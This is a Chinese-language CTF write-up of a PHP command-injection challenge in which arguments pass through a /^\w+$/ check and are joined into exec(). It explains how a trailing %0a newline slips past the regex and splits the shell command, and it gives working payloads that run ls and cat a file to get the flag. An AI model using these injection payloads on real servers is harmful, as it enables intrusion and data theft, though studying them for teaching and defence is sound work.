# eval.php 过滤绕过与拿到 flag 的 Writeup

## 题目信息

已知题目核心代码如下：

```php
<?php
    chdir(__DIR__);
    $args = @$_GET['args'];
    if (!is_array($args)) {
        $args = [];
    }
    if (count($args) > 3) {
        exit();
    }
    for ($i = 0; $i < count($args); $i++) {
        if (!preg_match('/^\w+$/', $args[$i])) {
            exit();
        }
    }
    $cmd = "/bin/9527 " . implode(" ", $args);
    exec($cmd, $out);
    for ($i = 0; $i < count($out); $i++) {
        echo($out[$i]);
        echo('<br>');
    }
?>
```

从代码可以看出，用户可控点只有 `$_GET['args']`。程序会把它们拼接成：

```bash
/bin/9527 arg1 arg2 arg3
```

然后交给 `exec()` 执行。

---

## 一、先看限制条件

代码里一共有三层限制：

### 1. `args` 必须是数组

```php
if (!is_array($args)) {
    $args = [];
}
```

所以传参时要写成：

```text
?args[]=xxx&args[]=yyy
```

### 2. 参数数量不能超过 3 个

```php
if (count($args) > 3) {
    exit();
}
```

也就是说最多只能传 3 个参数。

### 3. 每个参数都必须匹配 `/^\w+$/`

```php
if (!preg_match('/^\w+$/', $args[$i])) {
    exit();
}
```

这意味着表面上看，每个参数只能由下面这类字符组成：

- 字母 `a-zA-Z`
- 数字 `0-9`
- 下划线 `_`

像这些常见命令注入字符：

- 空格
n- 分号 `;`
- 反引号 `` ` ``
- 管道符 `|`
- 与号 `&`
- 斜杠 `/`

都不能直接出现。

所以如果只看表面，会觉得这题没法注入。

---

## 二、真正的突破点在哪里

突破点就在这一句正则：

```php
preg_match('/^\w+$/', $args[$i])
```

很多人会以为这句表示：**整个字符串从头到尾都必须是 `\w`**。

但这里有一个容易被忽略的点：

> 在 PCRE 中，`$` 默认不仅可以匹配字符串真正的结尾，还可以匹配“结尾换行符之前的位置”。

这就导致一个非常关键的现象：

```text
"1\n"
```

也就是 `1` 后面跟一个换行，这个字符串**有机会通过** `/^\w+$/` 的校验。

原因是：

- `^` 匹配字符串开头
- `\w+` 匹配 `1`
- `$` 匹配在最后那个换行符前面的位置

于是正则认为它“匹配成功了”。

---

## 三、为什么 `%0a` 能绕过

HTTP 请求里可以用 URL 编码传换行：

```text
%0a
```

例如：

```text
args[]=1%0a
```

服务端解码后，真实内容就是：

```text
1\n
```

也就是一个带换行的字符串。

这样一来会发生两件事：

### 第一件事：过正则

`1\n` 可能通过 `/^\w+$/`。

### 第二件事：影响 shell 解析

后面程序会把参数拼进命令：

```php
$cmd = "/bin/9527 " . implode(" ", $args);
exec($cmd, $out);
```

假设我们传入：

```text
?args[]=1%0a&args[]=ls
```

那么拼接结果会变成：

```bash
/bin/9527 1
 ls
```

注意，这里已经不是一条命令了，而是两行。

对 shell 来说，**换行本身就可以作为命令分隔符**。

也就是说 shell 实际会把它理解成：

```bash
/bin/9527 1
ls
```

于是：

1. 第一行执行 `/bin/9527 1`
2. 第二行执行 `ls`

这就完成了命令注入。

---

## 四、为什么不用分号也能执行命令

很多命令注入题目里，大家习惯用：

```bash
; ls
```

但这题分号根本过不了正则，所以不能直接写。

这里利用的是：

- 换行 `\n`
- shell 会把换行当成命令分隔符

所以 `%0a` 在这里等价于“偷偷插入一条新命令”。

这也是这题最核心的绕过原理。

---

## 五、利用流程

### 第一步：确认是否能执行命令

先列目录：

```text
/eval.php?args[]=1%0a&args[]=ls
```

如果成功，页面会回显当前目录下的文件。

### 第二步：读取可疑文件

如果目录里有 `passwd`，就继续读取：

```text
/eval.php?args[]=1%0a&args[]=cat&args[]=passwd
```

拼接后的命令相当于：

```bash
/bin/9527 1
cat passwd
```

于是就能看到 `passwd` 的内容。

如果 flag 就在 `passwd` 里，那么这里就能直接拿到 flag。

---

## 六、为什么 payload 要这样构造

很多人会问：为什么第一个参数一定写成 `1%0a`，而不是别的？

原因有两个：

### 1. 前面必须先有一个能通过 `\w+` 的内容

比如：

- `1`
- `a`
- `test`

都行。

因为正则至少要先匹配到一个 `\w` 字符，不能上来就是换行。

所以常见写法就是：

```text
1%0a
```

### 2. `%0a` 要放在第一个参数里，才能把后面的参数变成新命令

例如：

```text
args[]=1%0a&args[]=cat&args[]=passwd
```

`implode(" ", $args)` 后会变成：

```bash
/bin/9527 1
 cat passwd
```

虽然 `cat` 前面有一个空格，但 shell 一样能正常执行。

所以后两个参数正好就能组成：

```bash
cat passwd
```

---

## 七、完整攻击链总结

这题的完整思路可以概括成下面四步：

### 1. 找到可控输入

可控参数是：

```php
$_GET['args']
```

### 2. 发现存在命令执行

```php
exec($cmd, $out)
```

说明最终会把拼接后的字符串交给系统命令执行。

### 3. 研究过滤逻辑

过滤要求每个参数都满足：

```php
/^\w+$/
```

正常的注入字符都过不去。

### 4. 利用换行绕过正则并切断命令

通过：

```text
1%0a
```

让它：

- 对正则看起来像“合法字符串”
- 对 shell 看起来像“命令分隔符”

最终实现注入。

---

## 八、最终可用 payload

### 列目录

```text
?args[]=1%0a&args[]=ls
```

### 读取 `passwd`

```text
?args[]=1%0a&args[]=cat&args[]=passwd
```

---

## 九、这题考察的知识点

这题主要考察以下几个知识点：

1. **PHP 正则与 PCRE 的匹配细节**  
   尤其是 `$` 对末尾换行的处理。

2. **URL 编码**  
   `%0a` 代表换行。

3. **shell 命令解析规则**  
   换行可以作为命令分隔符。

4. **命令注入绕过思路**  
   当分号、空格、管道都被过滤时，可以换个角度利用换行。

---

## 十、一句话总结

这题不是直接绕过 `exec()`，而是利用 **`preg_match('/^\w+$/')` 对末尾换行处理不严** 的特点，用 `%0a` 构造出一个“既能过正则、又能切断 shell 命令”的参数，最终把后续参数变成新的系统命令执行，从而通过 `ls`、`cat passwd` 拿到 flag。

---

## 十一、可直接提交的简版结论

本题的漏洞点在于，程序虽然使用 `/^\w+$/` 对参数进行限制，但没有考虑到换行符带来的影响。攻击者可通过传入 `1%0a`，使参数在正则校验阶段通过，而在 shell 执行阶段被解释为命令分隔符。这样，后续参数即可作为新的命令执行。利用 `?args[]=1%0a&args[]=ls` 可先查看目录，再通过 `?args[]=1%0a&args[]=cat&args[]=passwd` 读取目标文件，最终获得 flag。
